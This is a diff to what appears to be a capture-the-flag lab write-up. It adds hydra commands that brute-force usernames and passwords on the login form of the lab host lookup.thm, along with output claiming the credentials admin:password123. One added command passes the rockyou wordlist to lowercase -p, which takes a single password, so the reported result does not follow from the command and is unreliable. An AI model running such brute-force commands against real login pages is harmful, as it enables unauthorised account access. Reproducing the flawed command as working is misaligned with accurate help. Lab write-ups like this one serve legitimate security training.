@@ -92,12 +92,21 @@ Output:
 
 We successfully find the username `jose` with password `password123`.
 
-#### Step 2: Finding the Username
+#### Step 2: Finding the Username&Password 
 
-Next, we brute force the username:
+#### Password
 
 ```bash
-hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
+hydra -l admin -p wordlist/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
+```
+
+Output:
+```
+[80][http-post-form] host: lookup.thm   login: admin   password: password123
+```
+#### Username
+```bash
+hydra -L /seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
 ```
 
 Output:
